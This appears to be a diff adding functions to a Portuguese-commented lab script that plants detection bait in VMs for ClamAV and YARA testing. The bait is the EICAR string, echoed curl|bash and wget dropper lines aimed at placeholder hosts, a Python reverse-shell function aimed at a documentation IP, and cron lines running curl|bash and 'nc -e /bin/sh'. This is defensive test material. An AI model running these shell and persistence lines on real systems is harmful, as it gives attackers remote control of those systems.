@@ -141,3 +141,93 @@ cat > /opt/old-app/uploads/avatar.php <<'PHP'
 PHP
 REMOTE
 }
+
+# plant::eicar VM_NAME
+# Planta a string EICAR padrao (test antivirus oficial — totalmente inofensiva,
+# mas qualquer AV decente detecta). ClamAV vai marcar como Eicar-Signature.
+# Referencia: https://www.eicar.org/download-anti-malware-testfile/
+plant::eicar() {
+  local name="$1"
+  echo "  + plantando EICAR em $name (ClamAV vai detectar)"
+  orb -m "$name" -u root bash -s <<'REMOTE'
+set -e
+mkdir -p /tmp/lab-bait
+# String EICAR exata — definida em ISO/IEC pelo proprio EICAR pra teste
+cat > /tmp/lab-bait/eicar.txt <<'EICAR'
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+EICAR
+chown root:root /tmp/lab-bait/eicar.txt
+REMOTE
+}
+
+# plant::dropper VM_NAME
+# Planta script com padrao curl|bash + base64 eval — bate com regras
+# DropperBashCurlPipe e DropperBase64Eval (T1059.004 — Unix Shell).
+plant::dropper() {
+  local name="$1"
+  echo "  + plantando dropper bash em $name (YARA Dropper)"
+  orb -m "$name" -u root bash -s <<'REMOTE'
+set -e
+mkdir -p /tmp/lab-bait
+cat > /tmp/lab-bait/dropper.sh <<'SH'
+#!/bin/sh
+# Dropper de teste — texto inofensivo. Casa com YARA DropperBashCurlPipe.
+echo "Pretending to drop:"
+echo "  curl https://evil.example.com/x.sh | bash"
+echo "  wget -O /tmp/payload http://malicious.test && chmod +x /tmp/payload"
+# Padrao base64 + eval (DropperBase64Eval):
+#   echo 'aWQ=' | base64 -d | bash
+exit 0
+SH
+chmod 644 /tmp/lab-bait/dropper.sh
+REMOTE
+}
+
+# plant::reverse_shell VM_NAME
+# Planta template Python de reverse shell — bate com ReverseShellPython
+# (T1059.006 — Python). NAO executa: so o texto da definicao serve.
+plant::reverse_shell() {
+  local name="$1"
+  echo "  + plantando template reverse shell Python em $name (YARA ReverseShell)"
+  orb -m "$name" -u root bash -s <<'REMOTE'
+set -e
+mkdir -p /tmp/lab-bait
+cat > /tmp/lab-bait/reverse_shell.py <<'PY'
+#!/usr/bin/env python3
+# Reverse shell de teste — INOFENSIVO. Sem __main__, nao executa.
+import socket
+import subprocess
+import os
+
+def fake_reverse_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("198.51.100.1", 4444))  # IP RFC 5737 — nao existe
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
+
+print("Reverse shell template (NAO executar)")
+PY
+chmod 644 /tmp/lab-bait/reverse_shell.py
+REMOTE
+}
+
+# plant::persistence VM_NAME
+# Planta crontab-like file com padroes de persistencia (curl|bash + nc -e).
+# Bate com PersistenceCronBackdoor. NAO eh colocado em /etc/cron.d pra evitar
+# qualquer chance de execucao real — fica em /tmp pra YARA achar.
+plant::persistence() {
+  local name="$1"
+  echo "  + plantando padrao cron-backdoor em $name (YARA Persistence)"
+  orb -m "$name" -u root bash -s <<'REMOTE'
+set -e
+mkdir -p /tmp/lab-bait
+cat > /tmp/lab-bait/cron_backdoor <<'CRON'
+# Cron backdoor de teste — INOFENSIVO. Em /tmp, NAO em /etc/cron.d.
+*/5 * * * * root curl -s https://evil.example.test/payload.sh | bash > /dev/null 2>&1
+@reboot root /bin/bash -c "while true; do nc -e /bin/sh 198.51.100.1 4444; sleep 60; done"
+CRON
+chmod 644 /tmp/lab-bait/cron_backdoor
+REMOTE
+}
